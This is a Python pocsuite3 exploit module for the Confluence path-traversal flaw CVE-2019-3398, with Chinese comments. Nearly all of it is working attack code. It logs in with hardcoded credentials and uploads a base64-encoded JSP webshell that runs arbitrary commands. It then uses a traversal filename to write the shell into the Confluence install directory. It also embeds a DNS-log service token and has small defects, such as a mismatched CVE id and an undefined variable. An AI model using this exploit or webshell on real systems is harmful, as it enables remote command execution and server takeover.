#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import base64
from string import ascii_letters

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE




'''
CVE-2019-3398
'''
class Confluence_3398_POC(POCBase):
    vulID = 'Confluence-CVE-2019-3396'
    appName = 'Confluence'
    appVersion = '''All 2.x.x
    All 3.x.x versions
    All 4.x.x versions
    All 5.x.x versions
    All 6.0.x versions
    All 6.1.x versions
    All 6.2.x versions
    All 6.3.x versions
    All 6.4.x versions
    All 6.5.x versions
    All 6.6.x versions before 6.6.13
    All 6.7.x versions
    All 6.8.x versions
    All 6.9.x versions
    All 6.10.x versions
    All 6.11.x versions
    All 6.12.x versions before 6.12.4
    All 6.13.x versions before 6.13.4
    All 6.14.x versions before 6.14.3
    All 6.15.x versions before 6.15.2'''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.PATH_TRAVERSAL

    vulDate = '2019-04-17'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-02-17'  # 编写 PoC 的日期
    updateDate = '2020-02-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://confluence.atlassian.com/doc/confluence-security-advisory-2019-04-17-968660855.html',
                    'https://github.com/superevr/cve-2019-3398/blob/master/poc.py']  # 漏洞地址来源,0day不用写
    name = 'Confluence路径穿越漏洞 CVE-2019-3398'  # PoC 名称
    install_requires = ["bs4"]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    http_proxy  = "http://127.0.0.1:8087"
    proxies = {"http": http_proxy, "https": http_proxy}

    # 漏洞利用需要一个可以创建页面的用户账号
    values = {'os_username':'cqq', 'os_password':'cqq',
        'login':'Log+in', 'os_destination':''}


    def _verify(self):

        from bs4 import BeautifulSoup

        result={}

        vul_url = self.url

        headers = {
            "X-Atlassian-Token": "no-check",
        }

        jspshell = 'PCVAIHBhZ2UKaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4KPCUKJT4KPEhUTUw+CjxCT0RZPgo8SDM+SlNQIFNIRUxMPC9IMz4KPEZPUk0gTUVUSE9EPSJHRVQiIE5BTUU9Im15Zm9ybSIKQUNUSU9OPSIiPgo8SU5QVVQgVFlQRT0idGV4dCIgTkFNRT0iY21kIj4KPElOUFVUIFRZUEU9InN1Ym1pdCIgVkFMVUU9IkV4ZWN1dGUiPgo8L0ZPUk0+CjxQUkU+CjwlCmlmIChyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgIT0gbnVsbCkgewpvdXQucHJpbnRsbigiQ29tbWFuZDogIiArCnJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSArICI8QlI+Iik7ClByb2Nlc3MgcCA9ClJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsKSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7CkRhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsKd2hpbGUgKCBkaXNyICE9IG51bGwgKSB7Cm91dC5wcmludGxuKGRpc3IpOwpkaXNyID0gZGlzLnJlYWRMaW5lKCk7Cn0KfQolPgo8L1BSRT4KPC9CT0RZPgo8L0hUTUw+Cg=='

        login = req.post(vul_url + '/dologin.action', headers=headers, data=values)

        soup = BeautifulSoup(login.text, 'html.parser')

        createpage = req.get(vul_url + '/pages/createpage.action')

        soup = BeautifulSoup(createpage.text, 'html.parser')

        draft_id = soup.select_one('meta[name="ajs-draft-id"]').get('content',None)

        attach_url = vul_url + '/plugins/drag-and-drop/upload.action?draftId=' + draft_id +\
            '&filename=../../../../../../opt/atlassian/confluence/confluence/shell.jsp&size=637&mimeType=text%2fplain'

        # 第一步，先将webshell上传上去，其内容会出现在confluence的安装目录;
        # 注意上传的时候的size参数需与Content-Length值保持一致，服务端会对这个做校验，若发现不一致，则会导致失败响应500。
        resp = req.post(attach_url, headers=headers, data=base64.b64decode(jspshell))

        # 第二步，通过路径穿越将缓存的webshell内容写入指定的路径
        trigger_url = vul_url + '/pages/downloadallattachments.action?pageId=' + draft_id
        if resp.status_code == 200:
            resp = req.get(trigger_url, headers=headers)
            if resp.status_code == 200:
                print('Success! Go to ' + url + 'shell.jsp for your shell!')

        return self.save_output(result)

    # 攻击模块
    def _attack(self):
        self._verify()


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output




# 注册类
register_poc(Confluence_3398_POC)
